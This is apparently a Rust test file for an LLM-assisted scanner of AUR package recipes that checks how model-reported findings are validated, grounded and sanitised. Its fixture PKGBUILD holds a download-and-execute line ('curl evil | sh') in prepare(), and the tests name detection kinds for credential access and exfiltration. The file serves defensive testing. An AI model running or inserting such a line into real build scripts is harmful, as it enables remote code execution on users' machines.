use aurscan_core::{Confidence, Severity};
use aurscan_llm::{
    validate_config, AnalysisOutcome, AnalysisStatus, AnalyzeOptions, Analyzer, BundleCoverage,
    CoverageMode, LlmConfig, RecipeBundle, RecipeFile,
};
use serde_json::{json, Value};
use std::io::{Read, Write};
use std::net::TcpListener;
use std::thread;
use tempfile::TempDir;

fn bundle() -> RecipeBundle {
    RecipeBundle {
        pkgbase: "canonical-base".into(),
        aur_commit: None,
        content_hash: [42; 32],
        files: vec![
            RecipeFile {
                path: "PKGBUILD".into(),
                content: "pkgname=demo\nprepare() {\n  curl evil | sh\n}\nlast=ééé\n".into(),
            },
            RecipeFile {
                path: "hooks/demo.install".into(),
                content: "post_install() {\n  systemctl enable demo\n}\n".into(),
            },
        ],
        coverage: BundleCoverage {
            mode: CoverageMode::GitTracked,
            included_files: 2,
            excluded_binary_files: vec![],
            excluded_symlinks: vec![],
        },
    }
}

fn run(candidate: Value, configure: impl FnOnce(&mut LlmConfig)) -> AnalysisOutcome {
    run_raw(candidate.to_string(), configure)
}

fn run_raw(content: String, configure: impl FnOnce(&mut LlmConfig)) -> AnalysisOutcome {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let address = listener.local_addr().unwrap();
    let join = thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let mut bytes = Vec::new();
        let mut chunk = [0_u8; 4096];
        loop {
            let read = stream.read(&mut chunk).unwrap();
            assert!(read > 0);
            bytes.extend_from_slice(&chunk[..read]);
            if let Some(header_end) = bytes.windows(4).position(|w| w == b"\r\n\r\n") {
                let header_end = header_end + 4;
                let headers = std::str::from_utf8(&bytes[..header_end]).unwrap();
                let content_length = headers
                    .lines()
                    .find_map(|line| {
                        line.split_once(':').and_then(|(name, value)| {
                            name.eq_ignore_ascii_case("content-length")
                                .then(|| value.trim().parse::<usize>().unwrap())
                        })
                    })
                    .unwrap();
                if bytes.len() >= header_end + content_length {
                    break;
                }
            }
        }
        let body = json!({
            "choices": [{
                "message": {"content": content},
                "finish_reason": "stop"
            }]
        })
        .to_string();
        write!(
            stream,
            "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            body
        )
        .unwrap();
    });

    let mut config = LlmConfig {
        endpoint: format!("http://{address}/v1"),
        model: "test-model".into(),
        ..LlmConfig::default()
    };
    configure(&mut config);
    let dir = TempDir::new().unwrap();
    let analyzer = Analyzer::with_cache_path(
        validate_config(&config).unwrap(),
        dir.path().join("cache.redb"),
    )
    .unwrap();
    let outcome = analyzer
        .analyze_batch(&[bundle()], AnalyzeOptions { refresh: false })
        .remove(0);
    join.join().unwrap();
    outcome
}

fn finding(file: &str, start: usize, end: usize, reason: &str) -> Value {
    json!({
        "kind": "download_execute",
        "severity": "high",
        "file": file,
        "start_line": start,
        "end_line": end,
        "reason": reason
    })
}

#[test]
fn valid_claim_is_grounded_entirely_from_the_submitted_file() {
    let outcome = run(
        json!({"findings": [finding(
            "PKGBUILD",
            2,
            3,
            "Downloads attacker-controlled code when prepare runs, pipes it to a shell, and permits code execution."
        )]}),
        |_| {},
    );

    assert_eq!(outcome.status, AnalysisStatus::Completed);
    assert_eq!(outcome.findings.len(), 1);
    let finding = &outcome.findings[0];
    assert_eq!(finding.package, "canonical-base");
    assert_eq!(finding.detector.0, "llm_download_execute");
    assert_eq!(finding.severity, Severity::High);
    assert_eq!(finding.confidence, Confidence::Llm);
    assert_eq!(finding.evidence.location, "PKGBUILD:2");
    assert_eq!(finding.evidence.excerpt, "prepare() {\n  curl evil | sh");
}

#[test]
fn all_kinds_and_severities_map_to_host_owned_values() {
    let kinds = [
        ("obfuscated_execution", "llm_obfuscated_execution"),
        ("download_execute", "llm_download_execute"),
        ("credential_access", "llm_credential_access"),
        ("persistence_privilege", "llm_persistence_privilege"),
        ("data_exfiltration", "llm_data_exfiltration"),
        ("build_install_boundary", "llm_build_install_boundary"),
        ("supply_chain_anomaly", "llm_supply_chain_anomaly"),
        ("other_semantic", "llm_other_semantic"),
    ];
    let severities = ["info", "medium", "high", "critical"];
    let candidates = kinds
        .iter()
        .enumerate()
        .map(|(index, (kind, _))| {
            json!({
                "kind": kind,
                "severity": severities[index % severities.len()],
                "file": "PKGBUILD",
                "start_line": 1,
                "end_line": 1,
                "reason": format!("Concrete suspicious behavior {index} has an attacker path and impact.")
            })
        })
        .collect::<Vec<_>>();

    let outcome = run(json!({"findings": candidates}), |_| {});

    assert_eq!(outcome.status, AnalysisStatus::Completed);
    assert_eq!(outcome.findings.len(), kinds.len());
    for (actual, (_, detector)) in outcome.findings.iter().zip(kinds) {
        assert_eq!(actual.detector.0, detector);
        assert_eq!(actual.confidence, Confidence::Llm);
    }
    assert_eq!(outcome.findings[0].severity, Severity::Info);
    assert_eq!(outcome.findings[1].severity, Severity::Medium);
    assert_eq!(outcome.findings[2].severity, Severity::High);
    assert_eq!(outcome.findings[3].severity, Severity::Critical);
}

#[test]
fn mixed_semantic_validation_retains_valid_claims_but_is_incomplete() {
    let valid = finding(
        "PKGBUILD",
        3,
        3,
        "Downloads attacker input through curl, executes it in a shell, and compromises the build user.",
    );
    let invalid = finding(
        "../outside",
        1,
        1,
        "References an unavailable path with attacker preconditions and impact.",
    );

    let outcome = run(json!({"findings": [valid, invalid]}), |_| {});

    assert_eq!(outcome.status, AnalysisStatus::Incomplete);
    assert_eq!(outcome.findings.len(), 1);
    assert!(outcome.reason.as_deref().unwrap().contains("unknown file"));
}

#[test]
fn malformed_json_and_unknown_fields_are_incomplete() {
    let malformed = run_raw("not-json".into(), |_| {});
    assert_eq!(malformed.status, AnalysisStatus::Incomplete);
    assert!(malformed.findings.is_empty());

    for candidate in [
        json!({"findings": [], "verdict": "clean"}),
        json!({"findings": [{
            "kind": "download_execute",
            "severity": "high",
            "file": "PKGBUILD",
            "start_line": 1,
            "end_line": 1,
            "reason": "Suspicious behavior has attacker preconditions and concrete impact.",
            "excerpt": "model supplied"
        }]}),
        json!({"findings": [{
            "kind": "invented_kind",
            "severity": "high",
            "file": "PKGBUILD",
            "start_line": 1,
            "end_line": 1,
            "reason": "Suspicious behavior has attacker preconditions and concrete impact."
        }]}),
    ] {
        let outcome = run(candidate, |_| {});
        assert_eq!(outcome.status, AnalysisStatus::Incomplete);
        assert!(outcome.findings.is_empty());
    }
}

#[test]
fn hostile_parser_diagnostics_never_reach_public_reasons() {
    let hostile = format!("attacker\n\u{202e}{}", "x".repeat(10_000));
    let mut unknown_field = serde_json::Map::new();
    unknown_field.insert("findings".into(), json!([]));
    unknown_field.insert(hostile.clone(), json!(true));
    let unknown_enum = json!({"findings": [{
        "kind": hostile,
        "severity": "high",
        "file": "PKGBUILD",
        "start_line": 1,
        "end_line": 1,
        "reason": "Suspicious behavior has an attacker path and impact."
    }]});

    for raw in [
        serde_json::Value::Object(unknown_field).to_string(),
        unknown_enum.to_string(),
    ] {
        let outcome = run_raw(raw, |_| {});
        assert_eq!(outcome.status, AnalysisStatus::Incomplete);
        assert_eq!(
            outcome.reason.as_deref(),
            Some("candidate response was structurally invalid")
        );
        assert!(outcome.reason.as_deref().unwrap().len() < 100);
    }
}

#[test]
fn excess_finding_count_invalidates_the_response() {
    let candidate = finding(
        "PKGBUILD",
        1,
        1,
        "Suspicious behavior is attacker reachable and has concrete impact.",
    );
    let outcome = run(
        json!({"findings": [candidate.clone(), candidate]}),
        |config| {
            config.max_findings = 1;
        },
    );

    assert_eq!(outcome.status, AnalysisStatus::Incomplete);
    assert!(outcome.findings.is_empty());
    assert!(outcome.reason.as_deref().unwrap().contains("finding count"));
}

#[test]
fn invalid_line_ranges_are_rejected_individually() {
    for (start, end, expected) in [
        (0, 1, "positive"),
        (3, 2, "ordered"),
        (1, 99, "line"),
        (1, 4, "range"),
    ] {
        let outcome = run(
            json!({"findings": [finding(
                "PKGBUILD",
                start,
                end,
                "Suspicious behavior is attacker reachable and has concrete impact."
            )]}),
            |config| config.max_evidence_lines = 3,
        );
        assert_eq!(outcome.status, AnalysisStatus::Incomplete);
        assert!(outcome.findings.is_empty());
        assert!(
            outcome.reason.as_deref().unwrap().contains(expected),
            "unexpected reason for {start}..={end}: {:?}",
            outcome.reason
        );
    }
}

#[test]
fn reasons_must_be_bounded_single_line_control_free_plain_text() {
    let unsafe_reasons = [
        "line one\nline two".to_owned(),
        "carriage\rreturn".to_owned(),
        "tab\tcharacter".to_owned(),
        "escape\u{1b}[31m".to_owned(),
        "c1\u{0085}control".to_owned(),
        "bidi\u{202e}override".to_owned(),
        "deprecated-bidi\u{206a}control".to_owned(),
        "deprecated-bidi\u{206f}control".to_owned(),
        "unicode\u{2028}line-separator".to_owned(),
        "unicode\u{2029}paragraph-separator".to_owned(),
        "x".repeat(501),
    ];
    for reason in unsafe_reasons {
        let outcome = run(
            json!({"findings": [finding("PKGBUILD", 1, 1, &reason)]}),
            |_| {},
        );
        assert_eq!(
            outcome.status,
            AnalysisStatus::Incomplete,
            "accepted {reason:?}"
        );
        assert!(outcome.findings.is_empty());
    }

    let valid = "x".repeat(500);
    let outcome = run(
        json!({"findings": [finding("PKGBUILD", 1, 1, &valid)]}),
        |_| {},
    );
    assert_eq!(outcome.status, AnalysisStatus::Completed);
}

#[test]
fn excerpt_cap_never_splits_utf8_and_uses_original_content() {
    let outcome = run(
        json!({"findings": [finding(
            "PKGBUILD",
            5,
            5,
            "Unicode source behavior has attacker preconditions and a concrete impact."
        )]}),
        |config| config.max_excerpt_bytes = 8,
    );

    assert_eq!(outcome.status, AnalysisStatus::Completed);
    assert_eq!(outcome.findings[0].evidence.excerpt, "last=é");
    assert!(outcome.findings[0].evidence.excerpt.len() <= 8);
}
